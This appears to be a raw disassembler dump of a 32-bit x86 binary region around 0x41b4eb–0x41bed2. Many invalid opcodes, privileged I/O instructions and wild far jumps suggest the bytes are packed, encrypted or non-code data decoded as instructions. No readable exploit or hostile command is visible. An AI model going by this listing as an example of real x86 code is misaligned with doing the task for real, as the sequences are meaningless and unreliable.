  41b4eb:	mov    ch,0x4d
  41b4ed:	aad    0x7b
  41b4ef:	mov    ah,dh
  41b4f1:	leave  
  41b4f2:	add    eax,0x733ffea1
  41b4f7:	inc    ebp
  41b4f8:	es std 
  41b4fa:	dec    ecx
  41b4fb:	mov    es,esi
  41b4fd:	test   DWORD PTR [edx],ebx
  41b4ff:	xchg   DWORD PTR [esi],esp
  41b501:	out    dx,al
  41b502:	loope  0x41b55b
  41b504:	(bad)  
  41b505:	adc    eax,DWORD PTR [esi-0x55b43212]
  41b50b:	mov    ebx,0xa9aae2f6
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	cmp    ecx,ebx
  41b582:	mov    ds:0x12218c2,al
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	xchg   ebx,eax
  41b58d:	das    
  41b58e:	push   bp
  41b590:	xchg   edx,ebx
  41b592:	dec    ebx
  41b593:	loop   0x41b547
  41b595:	fist   WORD PTR [edx-0x62570f1]
  41b59b:	lock sub al,0xef
  41b59e:	das    
  41b59f:	sub    BYTE PTR [ebx],ah
  41b5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a2:	and    dl,bl
  41b5a4:	ja     0x41b5c3
  41b5a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5a7:	stc    
  41b5a8:	fst    QWORD PTR [ebx+edi*2+0x3]
  41b5ac:	out    0x12,eax
  41b5ae:	dec    esi
  41b5af:	into   
  41b5b0:	hlt    
  41b5b1:	shr    BYTE PTR [ecx+0x47667265],1
  41b5b7:	ds stos DWORD PTR es:[edi],eax
  41b5b9:	lea    esp,[ebx+0x17]
  41b5bc:	jno    0x41b5f8
  41b5be:	test   eax,0x7b5da96
  41b5c3:	or     BYTE PTR [edx-0xfc52545],al
  41b5c9:	pop    ss
  41b5ca:	jg     0x41b5bd
  41b5cc:	stc    
  41b5cd:	(bad)  
  41b5ce:	in     al,0xd0
  41b5d0:	jge    0x41b5eb
  41b5d2:	or     al,0x92
  41b5d4:	cwde   
  41b5d5:	xchg   esi,eax
  41b5d6:	imul   BYTE PTR [edi-0x4a]
  41b5d9:	popa   
  41b5da:	cmp    esi,DWORD PTR [eax-0x1c31c6c0]
  41b5e0:	ds addr16 sub eax,0x84cbc749
  41b5e7:	push   edx
  41b5e8:	in     eax,dx
  41b5e9:	jo     0x41b587
  41b5eb:	jnp    0x41b65c
  41b5ed:	dec    eax
  41b5ee:	fsub   QWORD PTR [ecx-0x4a]
  41b5f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f2:	inc    esp
  41b5f3:	fsub   st(4),st
  41b5f5:	loop   0x41b5c8
  41b5f7:	mov    eax,0xafe7185
  41b5fc:	stos   DWORD PTR es:[edi],eax
  41b5fd:	repz popa 
  41b5ff:	push   cs
  41b600:	scas   al,BYTE PTR es:[edi]
  41b601:	aaa    
  41b602:	jo     0x41b5b2
  41b604:	call   0x9aefc292
  41b609:	stos   BYTE PTR es:[edi],al
  41b60a:	mov    ebp,0x2a255664
  41b60f:	ror    BYTE PTR [edi+0x18],0x72
  41b613:	add    bl,BYTE PTR [edi+0x5f5ab9db]
  41b619:	lock (bad) 
  41b61b:	in     eax,dx
  41b61c:	add    edx,edi
  41b61e:	aaa    
  41b61f:	cdq    
  41b620:	loopne 0x41b621
  41b622:	mov    bl,0x75
  41b624:	repz inc ebx
  41b626:	mov    ebp,0x990b10
  41b62b:	neg    ecx
  41b62d:	dec    edx
  41b62e:	sbb    eax,ebp
  41b630:	inc    esp
  41b631:	push   es
  41b632:	push   edx
  41b633:	ficom  DWORD PTR [ecx]
  41b635:	cmp    BYTE PTR [edi-0x20],0xb0
  41b639:	les    eax,FWORD PTR [esi]
  41b63b:	scas   eax,DWORD PTR es:[edi]
  41b63c:	adc    BYTE PTR [edx+0xd],bl
  41b63f:	jg     0x41b5c7
  41b641:	mov    bh,0x94
  41b643:	sub    ch,dh
  41b645:	adc    dh,BYTE PTR [esi-0x6]
  41b648:	dec    esp
  41b649:	inc    edi
  41b64a:	dec    edi
  41b64b:	jno    0x41b659
  41b64d:	stc    
  41b64e:	fdivr  QWORD PTR [ebx]
  41b650:	aam    0xd1
  41b652:	push   cs
  41b653:	xor    dl,BYTE PTR [ebp+0x23]
  41b656:	pop    edi
  41b657:	fwait
  41b658:	adc    al,0xaa
  41b65a:	pop    ebx
  41b65b:	jb     0x41b635
  41b65d:	jle    0x41b685
  41b65f:	sbb    eax,0xfaa251b8
  41b664:	xchg   BYTE PTR [ebp+0x5c],ch
  41b667:	jae    0x41b641
  41b669:	mov    ds,WORD PTR [ebp-0x12becdee]
  41b66f:	out    dx,al
  41b670:	(bad)  
  41b671:	mov    ebx,0xca6e685f
  41b676:	hlt    
  41b677:	mov    ds:0xb36a5958,ax
  41b67d:	xchg   ebp,eax
  41b67e:	std    
  41b67f:	popa   
  41b680:	or     esp,DWORD PTR [ebx]
  41b682:	pop    es
  41b683:	scas   eax,DWORD PTR es:[edi]
  41b684:	fnstcw WORD PTR [ebp+0x42]
  41b687:	sbb    DWORD PTR [edi+0x66],ecx
  41b68a:	mov    eax,ds:0x31dfde23
  41b68f:	pop    edx
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	sub    eax,0x1ca134d8
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR [ecx+eax*1],al
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	add    ah,bl
  41b70e:	cmp    ebp,DWORD PTR [eax-0x5c]
  41b711:	test   eax,ebp
  41b713:	out    0x5b,al
  41b715:	mov    ds:0xc4357e6a,eax
  41b71a:	aam    0x3
  41b71c:	sbb    esp,DWORD PTR [eax-0x49]
  41b71f:	mov    BYTE PTR [edi-0x48],ch
  41b722:	pusha  
  41b723:	fbstp  TBYTE PTR [edx+eiz*2]
  41b726:	add    esi,DWORD PTR [eax+0x20]
  41b729:	sbb    edi,DWORD PTR [bx]
  41b72c:	inc    ebp
  41b72d:	add    eax,0x3a2a5daa
  41b732:	xor    BYTE PTR [ebp+0x44],cl
  41b735:	cmp    ch,BYTE PTR [esp+eiz*2+0x11830521]
  41b73c:	mov    bh,0x1
  41b73e:	idiv   esp
  41b740:	repnz pop ds
  41b742:	push   0x68c888ca
  41b747:	scas   al,BYTE PTR es:[edi]
  41b748:	stos   DWORD PTR es:[edi],eax
  41b749:	sub    dl,BYTE PTR [esi]
  41b74b:	jecxz  0x41b762
  41b74d:	jmp    0x41b7b1
  41b74f:	outs   dx,BYTE PTR ds:[esi]
  41b750:	adc    al,0xba
  41b752:	in     al,dx
  41b753:	pop    ecx
  41b754:	outs   dx,BYTE PTR ds:[esi]
  41b755:	in     eax,dx
  41b756:	pop    esi
  41b757:	push   edi
  41b758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b759:	rcr    BYTE PTR [ebx],1
  41b75b:	sbb    DWORD PTR [ebp-0x2fd35d34],esi
  41b761:	push   ds
  41b762:	je     0x41b741
  41b764:	pusha  
  41b765:	jmp    0x11ce249a
  41b76a:	jnp    0x41b7bd
  41b76c:	test   eax,0x81f87276
  41b771:	arpl   WORD PTR [ebx+ebx*2+0x7b],si
  41b775:	or     dh,BYTE PTR [ebp-0x786ef1c4]
  41b77b:	arpl   WORD PTR [edi+0x44],di
  41b77e:	xor    al,BYTE PTR [ecx]
  41b780:	jmp    0x41b7e4
  41b782:	jae    0x41b7c3
  41b784:	inc    ecx
  41b785:	jnp    0x41b7da
  41b787:	(bad)  
  41b788:	mov    ebx,DWORD PTR [ebx-0x44]
  41b78b:	push   es
  41b78c:	aaa    
  41b78d:	pop    ebx
  41b78e:	mov    al,0x64
  41b790:	(bad)  
  41b791:	push   edi
  41b792:	int    0x9b
  41b794:	lods   al,BYTE PTR ds:[esi]
  41b795:	pop    es
  41b796:	ss popf 
  41b798:	or     cl,BYTE PTR [edx+0x7f7f6b80]
  41b79e:	jmp    0x528b9827
  41b7a3:	mov    edx,0xf6986b14
  41b7a8:	das    
  41b7a9:	imul   ebp,DWORD PTR [eax+0x72f40a91],0x932aa71b
  41b7b3:	cmp    DWORD PTR [eax+eiz*2-0x42ad5067],edx
  41b7ba:	lock adc eax,0x403751e
  41b7c0:	pop    eax
  41b7c1:	mov    al,0xf
  41b7c3:	out    0xaf,al
  41b7c5:	add    al,0x2
  41b7c7:	sub    BYTE PTR [ebp+0x2050f2ba],0x68
  41b7ce:	pop    es
  41b7cf:	xchg   esi,eax
  41b7d0:	sar    DWORD PTR [edi+0x2cdacc25],1
  41b7d6:	das    
  41b7d7:	mov    dl,0xf9
  41b7d9:	ins    DWORD PTR es:[edi],dx
  41b7da:	and    DWORD PTR [ebx-0x2ca8f163],ebx
  41b7e0:	stc    
  41b7e1:	fwait
  41b7e2:	mov    bl,0x7
  41b7e4:	fxch   st(6)
  41b7e6:	in     eax,dx
  41b7e7:	add    DWORD PTR ds:0xc117a0c8,ecx
  41b7ed:	dec    ebx
  41b7ee:	repz ja 0x41b84c
  41b7f1:	and    eax,DWORD PTR [eax+esi*2-0x4dbdb1a3]
  41b7f8:	xor    ebx,0x5ec3da2b
  41b7fe:	sti    
  41b7ff:	fs dec esp
  41b801:	inc    ebx
  41b802:	into   
  41b803:	gs mov al,0xd3
  41b806:	pop    edi
  41b807:	jl     0x41b80c
  41b809:	mov    ebx,0xf804b631
  41b80e:	jmp    0x41b7ab
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xf5
  41b881:	jmp    0x1:0x24202bac
  41b888:	add    al,0x1
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	jl     0x41b8e1
  41b88e:	rcr    DWORD PTR ds:0x9056dc34,0x17
  41b895:	cdq    
  41b896:	adc    BYTE PTR [eax-0x8],ah
  41b899:	test   ecx,esi
  41b89b:	data16 icebp 
  41b89d:	data16 jg 0x41b8a9
  41b8a0:	retf   
  41b8a1:	iret   
  41b8a2:	iret   
  41b8a3:	add    BYTE PTR [edi+esi*8+0x3763c592],bh
  41b8aa:	pop    eax
  41b8ab:	dec    eax
  41b8ac:	repnz jmp 0x42f5:0xbf226a69
  41b8b4:	push   eax
  41b8b5:	push   ss
  41b8b6:	shr    DWORD PTR [esi-0x55],cl
  41b8b9:	scas   al,BYTE PTR es:[edi]
  41b8ba:	pop    ds
  41b8bb:	mov    bh,0x46
  41b8bd:	push   eax
  41b8be:	add    bl,ch
  41b8c0:	mov    al,0xd0
  41b8c2:	jbe    0x41b8ea
  41b8c4:	stc    
  41b8c5:	push   ebx
  41b8c6:	sub    eax,0x4a0bdb32
  41b8cb:	push   esp
  41b8cc:	into   
  41b8cd:	in     eax,0x94
  41b8cf:	mov    edi,DWORD PTR [ebx-0x6d]
  41b8d2:	les    ebx,FWORD PTR [edx]
  41b8d4:	neg    edi
  41b8d6:	lea    esp,[ebx+0x6f]
  41b8d9:	fwait
  41b8da:	mov    al,ds:0x869c399a
  41b8df:	jge    0x41b8d4
  41b8e1:	sbb    bh,BYTE PTR [ebx+0x6a637bab]
  41b8e7:	push   cs
  41b8e8:	adc    DWORD PTR [ebx-0xe],ecx
  41b8eb:	int3   
  41b8ec:	pop    ecx
  41b8ed:	enter  0xfa58,0xc8
  41b8f1:	aaa    
  41b8f2:	nop
  41b8f3:	and    al,0x44
  41b8f5:	sub    BYTE PTR [ebx],dh
  41b8f7:	jl     0x41b899
  41b8f9:	xchg   edi,eax
  41b8fa:	jle    0x41b91b
  41b8fc:	retf   0xc19
  41b8ff:	and    esi,DWORD PTR [esi-0x51]
  41b902:	pop    ebp
  41b903:	jmp    0x8917:0xfe8b1f68
  41b90a:	icebp  
  41b90b:	call   0x84dd0115
  41b910:	jbe    0x41b8c1
  41b912:	ss push esi
  41b914:	add    BYTE PTR [ebx+0x5c],dh
  41b917:	inc    esi
  41b918:	dec    eax
  41b919:	xor    edx,edx
  41b91b:	xchg   BYTE PTR [bx+si+0x448c],cl
  41b920:	rcr    esp,0xc2
  41b923:	stc    
  41b924:	mov    esp,0x13d0090f
  41b929:	inc    ebx
  41b92a:	pop    ebp
  41b92b:	in     al,dx
  41b92c:	je     0x41b95c
  41b92e:	push   edx
  41b92f:	pushf  
  41b930:	js     0x41b924
  41b932:	xchg   ebp,eax
  41b933:	or     eax,0x33907b2e
  41b938:	mov    dh,0x60
  41b93a:	iret   
  41b93b:	ds leave 
  41b93d:	lds    ebx,FWORD PTR [esp+ebp*4]
  41b940:	sti    
  41b941:	repz xor esp,DWORD PTR [ebx+0xa]
  41b945:	mov    dh,0x69
  41b947:	rcr    edi,1
  41b949:	push   ds
  41b94a:	mov    eax,ds:0x5c846b0c
  41b94f:	push   es
  41b950:	imul   esp,DWORD PTR [ebx+0x5554f681],0xfffffff9
  41b957:	mov    al,0xe4
  41b959:	into   
  41b95a:	sbb    ah,BYTE PTR [edi+edx*4]
  41b95d:	pop    ds
  41b95e:	sbb    bh,BYTE PTR [edx]
  41b960:	mov    al,BYTE PTR [ecx-0x7f]
  41b963:	sub    BYTE PTR [esi-0x35c2fac4],bh
  41b969:	sti    
  41b96a:	or     DWORD PTR [ecx-0x1420142d],edx
  41b970:	and    al,0xf7
  41b972:	or     DWORD PTR [edi-0xc3261a4],eax
  41b978:	outs   dx,BYTE PTR ds:[esi]
  41b979:	enter  0xf27b,0x3d
  41b97d:	cmp    DWORD PTR [edi+ebp*4+0x7c],esp
  41b981:	cld    
  41b982:	xor    BYTE PTR [ebx+0x7c8b4fde],dl
  41b988:	(bad)  
  41b989:	mov    ah,BYTE PTR [edx-0x59]
  41b98c:	jmp    DWORD PTR [ecx+0x9e0]
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	dec    edx
  41ba01:	mov    bh,0xdd
  41ba03:	push   ebp
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	retf   0xa9e
  41ba0f:	enter  0x33f9,0x90
  41ba13:	pushf  
  41ba14:	inc    esi
  41ba15:	jno    0x41b9a4
  41ba17:	mov    ebp,0xef16cc47
  41ba1c:	jae    0x41b9d4
  41ba1e:	jmp    0x41ba0b
  41ba20:	mov    bl,0xe8
  41ba22:	loopne 0x41baa3
  41ba24:	call   0x34f19113
  41ba29:	xor    al,0x4b
  41ba2b:	mov    eax,ds:0xcb58e80d
  41ba30:	lock push es
  41ba32:	stc    
  41ba33:	mov    dh,0x8c
  41ba35:	cdq    
  41ba36:	mov    bh,0xca
  41ba38:	push   cs
  41ba39:	(bad)  
  41ba3a:	ss xor eax,0xf6f13f24
  41ba40:	xor    ah,BYTE PTR [eax-0x50]
  41ba43:	xchg   dh,dh
  41ba45:	xchg   DWORD PTR [eax-0x5e728d06],esp
  41ba4b:	test   al,0xb7
  41ba4d:	leave  
  41ba4e:	xchg   esi,eax
  41ba4f:	mov    edi,0xdb30b6da
  41ba54:	scas   eax,DWORD PTR es:[edi]
  41ba55:	pop    edi
  41ba56:	xor    al,0x5f
  41ba58:	push   ecx
  41ba59:	inc    esi
  41ba5a:	adc    esp,ebp
  41ba5c:	or     dh,BYTE PTR [edi+0x6b84e495]
  41ba62:	gs push eax
  41ba64:	mov    ds:0xd1d694d4,al
  41ba69:	aaa    
  41ba6a:	push   edi
  41ba6b:	pop    ds
  41ba6c:	stos   DWORD PTR es:[edi],eax
  41ba6d:	push   edi
  41ba6e:	js     0x41bac1
  41ba70:	fadd   QWORD PTR [edx]
  41ba72:	adc    bl,cl
  41ba74:	xor    dh,BYTE PTR [ebx+0x36]
  41ba77:	sub    dh,BYTE PTR [eax-0x35]
  41ba7a:	xchg   edi,eax
  41ba7b:	cmp    esp,edi
  41ba7d:	retf   
  41ba7e:	in     al,0x4d
  41ba80:	xor    bh,0x41
  41ba83:	addr16 pop ss
  41ba85:	(bad)  
  41ba86:	mov    esi,0x188e3b4b
  41ba8b:	sub    dl,dh
  41ba8d:	cli    
  41ba8e:	ja     0x41babc
  41ba90:	enter  0x4d2f,0xc4
  41ba94:	lds    edx,FWORD PTR [ebx-0x70]
  41ba97:	(bad)  
  41ba98:	sbb    eax,eax
  41ba9a:	cdq    
  41ba9b:	cdq    
  41ba9c:	dec    edi
  41ba9d:	fcom   QWORD PTR [ebp-0x6a]
  41baa0:	adc    eax,0x6442cf2e
  41baa5:	dec    esi
  41baa6:	out    0xd3,eax
  41baa8:	add    al,BYTE PTR [ecx-0x2f]
  41baab:	inc    ebp
  41baac:	push   esi
  41baad:	sbb    edx,DWORD PTR [ebx]
  41baaf:	inc    esi
  41bab0:	test   DWORD PTR [esi+edi*2+0x34a82b42],eax
  41bab7:	sub    ah,dh
  41bab9:	inc    eax
  41baba:	adc    al,BYTE PTR [esi+0xa]
  41babd:	or     BYTE PTR [ecx],al
  41babf:	sub    al,0x30
  41bac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bac2:	cmp    al,dh
  41bac4:	ins    DWORD PTR es:[edi],dx
  41bac5:	jb     0x41bb20
  41bac7:	not    bl
  41bac9:	arpl   WORD PTR [ebp+0x313f985b],sp
  41bacf:	xchg   edi,eax
  41bad0:	stc    
  41bad1:	inc    ecx
  41bad2:	arpl   WORD PTR [edi-0x4f9fd40c],dx
  41bad8:	mov    esi,0xdeee6c8c
  41badd:	cmp    eax,ebp
  41badf:	xchg   ebx,eax
  41bae0:	pop    ds
  41bae1:	leave  
  41bae2:	aam    0x55
  41bae4:	inc    edi
  41bae5:	xchg   esp,eax
  41bae6:	popa   
  41bae7:	dec    eax
  41bae8:	jne    0x41ba94
  41baea:	ret    0x8999
  41baed:	jo     0x41bb1d
  41baef:	sub    DWORD PTR [esi+edx*8+0x6f3f6466],0x29
  41baf7:	xchg   edx,eax
  41baf8:	push   es
  41baf9:	sub    ecx,DWORD PTR [ebx-0xf]
  41bafc:	fwait
  41bafd:	pop    ds
  41bafe:	push   esi
  41baff:	sub    dl,dh
  41bb01:	push   ds
  41bb02:	push   esi
  41bb03:	rcr    DWORD PTR [edx-0x714bbd67],1
  41bb09:	mov    dl,0x2b
  41bb0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0c:	xor    BYTE PTR [ecx-0x15],bl
  41bb0f:	js     0x41bb11
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x40],cx
  41bb81:	lock push 0xffffffaa
  41bb84:	sub    BYTE PTR [esi],ah
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	xchg   BYTE PTR [edi],dl
  41bb8e:	lods   eax,DWORD PTR ds:[esi]
  41bb8f:	out    dx,al
  41bb90:	adc    edx,DWORD PTR [edi-0x46]
  41bb93:	test   BYTE PTR [ebp-0x26],bl
  41bb96:	fcom   QWORD PTR [edi+eax*8]
  41bb99:	jae    0x41bc14
  41bb9b:	push   ss
  41bb9c:	sbb    ebx,DWORD PTR [esi-0x69]
  41bb9f:	dec    ebp
  41bba0:	inc    ecx
  41bba1:	jbe    0x41bbe4
  41bba3:	fs into 
  41bba5:	pusha  
  41bba6:	xor    al,0xe4
  41bba8:	popf   
  41bba9:	(bad)  
  41bbaa:	cmp    DWORD PTR [edx],esp
  41bbac:	xor    edi,DWORD PTR [ebx+0x29]
  41bbaf:	or     eax,0xb34c028a
  41bbb4:	jmp    0x57a4d408
  41bbb9:	pop    ebp
  41bbba:	int3   
  41bbbb:	jb     0x41bc16
  41bbbd:	cld    
  41bbbe:	add    dh,BYTE PTR [edi]
  41bbc0:	scas   eax,DWORD PTR es:[edi]
  41bbc1:	icebp  
  41bbc2:	mov    dh,0xe
  41bbc5:	dec    DWORD PTR ds:0xae4d7bbd
  41bbcb:	je     0x41bc48
  41bbcd:	cli    
  41bbce:	sub    al,0x7e
  41bbd0:	test   DWORD PTR [edi-0x3976a4d2],edx
  41bbd6:	bound  edx,QWORD PTR [eax+0x12]
  41bbd9:	imul   edx,DWORD PTR [ebp+eax*1+0xac302c6],0x4ea93606
  41bbe4:	mov    bl,0x2d
  41bbe6:	pop    es
  41bbe7:	and    esp,DWORD PTR [edx]
  41bbe9:	shl    BYTE PTR [eax],1
  41bbeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbec:	aas    
  41bbed:	std    
  41bbee:	retf   0xba53
  41bbf1:	xchg   ebx,eax
  41bbf2:	mov    esi,0xec40f9fc
  41bbf7:	cld    
  41bbf8:	mov    ds:0x75174dd8,eax
  41bbfd:	push   ebp
  41bbfe:	xchg   ecx,eax
  41bbff:	xchg   edx,eax
  41bc00:	(bad)  
  41bc01:	sbb    ecx,ebp
  41bc03:	push   eax
  41bc04:	mov    dl,0x25
  41bc06:	daa    
  41bc07:	or     DWORD PTR [edx+0x1c5f10c3],ebx
  41bc0d:	sub    edi,DWORD PTR [bx+si+0x2f]
  41bc11:	dec    eax
  41bc12:	lea    ebp,gs:[edi+0x2a2ede28]
  41bc19:	xor    DWORD PTR [edi-0x65],ebx
  41bc1c:	stc    
  41bc1d:	sub    eax,0x2637c14b
  41bc22:	mov    dl,0x64
  41bc24:	dec    edx
  41bc25:	and    ah,BYTE PTR [ebx+0x30]
  41bc28:	cld    
  41bc29:	push   ds
  41bc2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc2b:	mov    edi,0xce952a6d
  41bc30:	aas    
  41bc31:	pop    ds
  41bc32:	sbb    edi,0x8fb47ba5
  41bc38:	leave  
  41bc39:	and    BYTE PTR [edx-0x6c3a15c0],ch
  41bc3f:	frstor [esi]
  41bc41:	lds    edx,FWORD PTR [eax+0x3f]
  41bc44:	xor    al,0xf0
  41bc46:	dec    esp
  41bc47:	push   esp
  41bc48:	aaa    
  41bc49:	pop    ecx
  41bc4a:	pop    ebx
  41bc4b:	push   ds
  41bc4c:	mov    ecx,0x28d9da5a
  41bc51:	je     0x41bc23
  41bc53:	jle    0x41bbe3
  41bc55:	add    eax,0xe28df4b7
  41bc5a:	adc    BYTE PTR [eax],ah
  41bc5c:	addr16 xchg edi,eax
  41bc5e:	pusha  
  41bc5f:	repnz aaa 
  41bc61:	stos   BYTE PTR es:[edi],al
  41bc62:	std    
  41bc63:	xchg   ebx,eax
  41bc64:	mov    DWORD PTR [ebp+0x584b4d47],esi
  41bc6a:	xor    DWORD PTR [eax+0x666ef31d],ebx
  41bc70:	sub    DWORD PTR [esi+0xf773a8a],edx
  41bc76:	inc    ecx
  41bc77:	dec    esi
  41bc78:	shr    DWORD PTR [esi+0x7c0878db],0x32
  41bc7f:	xor    eax,0x7abb7506
  41bc84:	scas   al,BYTE PTR es:[edi]
  41bc85:	adc    DWORD PTR [ecx+0x7da44bd4],edi
  41bc8b:	stos   BYTE PTR es:[edi],al
  41bc8c:	push   eax
  41bc8d:	xchg   esp,eax
  41bc8e:	lds    edi,FWORD PTR [ebx+0x0]
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xea8d9d8
  41bd02:	dec    ebp
  41bd03:	and    ebp,DWORD PTR [edi+eiz*1]
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	mov    eax,ds:0x3f591698
  41bd11:	ret    
  41bd12:	popf   
  41bd13:	mov    ds:0x965657aa,eax
  41bd18:	mov    WORD PTR [edx],?
  41bd1a:	iret   
  41bd1b:	outs   dx,BYTE PTR ds:[esi]
  41bd1c:	cld    
  41bd1d:	retf   
  41bd1e:	in     eax,0xe7
  41bd20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd21:	mov    ah,0x9a
  41bd23:	sub    eax,0xa688e4d9
  41bd28:	popa   
  41bd29:	mov    edi,?
  41bd2b:	mov    ds:0xc90ca30b,al
  41bd30:	pop    ebp
  41bd31:	mov    eax,DWORD PTR [esi]
  41bd33:	jle    0x41bcfa
  41bd35:	jmp    0xd5aa:0xe9fd3cc6
  41bd3c:	jmp    0xe68ad7f
  41bd41:	adc    dl,BYTE PTR [edi+edx*1]
  41bd44:	cmp    BYTE PTR ds:0xe00c529f,cl
  41bd4a:	inc    ebx
  41bd4b:	ficomp DWORD PTR [ecx]
  41bd4d:	dec    esp
  41bd4e:	sahf   
  41bd4f:	jno    0x41bd9c
  41bd51:	enter  0x4d74,0x70
  41bd55:	jb     0x41bd59
  41bd57:	sub    eax,DWORD PTR [esi+0x5b81f9ad]
  41bd5d:	mov    ds:0x455d1892,eax
  41bd62:	pushf  
  41bd63:	call   0xa7e6:0xb6bf3870
  41bd6a:	mov    cl,0xfb
  41bd6c:	inc    ecx
  41bd6d:	lods   eax,DWORD PTR ds:[esi]
  41bd6e:	dec    ecx
  41bd6f:	add    BYTE PTR [edi+ecx*8],dh
  41bd72:	mov    ah,ch
  41bd74:	les    esp,FWORD PTR [edx-0x441923a0]
  41bd7a:	sub    al,0x46
  41bd7c:	jb     0x41bdb4
  41bd7e:	lea    esp,[edx-0x62]
  41bd81:	mov    ds:0x91fb7158,al
  41bd86:	dec    ebx
  41bd87:	add    ah,dh
  41bd89:	psrlq  mm3,QWORD PTR [edi]
  41bd8c:	in     al,dx
  41bd8d:	push   esp
  41bd8e:	sub    al,0x87
  41bd90:	cmp    BYTE PTR [esi+0x88c2fc7],bl
  41bd96:	sub    ebx,DWORD PTR [eax+0x11]
  41bd99:	mov    ebp,0x732090e0
  41bd9e:	or     eax,0xb304ce7a
  41bda3:	leave  
  41bda4:	pushf  
  41bda5:	jmp    0x8fde:0x294c306a
  41bdac:	push   ss
  41bdad:	xor    al,0xa4
  41bdaf:	jae    0x41bdfb
  41bdb1:	push   0xffffff9f
  41bdb3:	mov    eax,ds:0x399567e6
  41bdb8:	sub    BYTE PTR [esi-0x64a1d509],0x98
  41bdbf:	das    
  41bdc0:	and    al,0xcb
  41bdc2:	inc    esp
  41bdc3:	and    eax,0x1f3365f3
  41bdc8:	add    BYTE PTR [ebp+0x62cf8427],dh
  41bdce:	out    dx,al
  41bdcf:	jbe    0x41bd80
  41bdd1:	cwd    
  41bdd3:	mov    dl,0xd5
  41bdd5:	mov    BYTE PTR [edi+0x12],bl
  41bdd8:	and    dl,dl
  41bdda:	and    DWORD PTR [edi],esp
  41bddc:	ror    DWORD PTR [esi],cl
  41bdde:	sub    eax,0x1fa31e2a
  41bde3:	push   cs
  41bde4:	jle    0x41be63
  41bde6:	daa    
  41bde7:	ins    DWORD PTR es:[edi],dx
  41bde8:	aas    
  41bde9:	lods   al,BYTE PTR ds:[si]
  41bdeb:	fiadd  DWORD PTR [edi]
  41bded:	cmp    BYTE PTR [ebx+0xb],ah
  41bdf0:	add    BYTE PTR [ebx-0x61f9f45c],ch
  41bdf6:	out    dx,eax
  41bdf7:	pop    ds
  41bdf8:	and    BYTE PTR [esi+ebx*4],0xe1
  41bdfc:	xchg   BYTE PTR [ecx],bl
  41bdfe:	pop    ss
  41bdff:	add    esi,ebp
  41be01:	test   al,0x32
  41be03:	inc    eax
  41be04:	in     al,0x30
  41be06:	mov    dh,0x6c
  41be08:	scas   al,BYTE PTR es:[edi]
  41be09:	push   esp
  41be0a:	jb     0x41bdb7
  41be0c:	mov    al,ds:0xdee415
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x607ac09a]
  41be82:	pop    ecx
  41be83:	inc    esp
  41be84:	xor    BYTE PTR [eax],ch
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	jmp    0x2f7f7adc
  41be91:	mov    esi,0x39cca7a9
  41be96:	pop    ss
  41be97:	les    ebx,FWORD PTR [eax+0x65ef7242]
  41be9d:	jb     0x41bef4
  41be9f:	or     DWORD PTR [ebx-0x73],esi
  41bea2:	hlt    
  41bea3:	mov    edi,DWORD PTR [ebp+0x14739200]
  41bea9:	outs   dx,DWORD PTR ds:[esi]
  41beaa:	mov    edi,0xa0508153
  41beaf:	sbb    al,0x89
  41beb1:	adc    al,0x6a
  41beb3:	xor    DWORD PTR [edi-0x41],esi
  41beb6:	lods   al,BYTE PTR ds:[esi]
  41beb7:	dec    DWORD PTR [ecx+0x10]
  41beba:	and    ch,BYTE PTR [ecx-0x48e34562]
  41bec0:	cmp    al,0xa9
  41bec2:	(bad)  
  41bec3:	in     eax,dx
  41bec4:	pushf  
  41bec5:	fild   QWORD PTR [ebx-0x1b219185]
  41becb:	cld    
  41becc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41becd:	mov    esi,0xc87e96a2
  41bed2:	pushf  
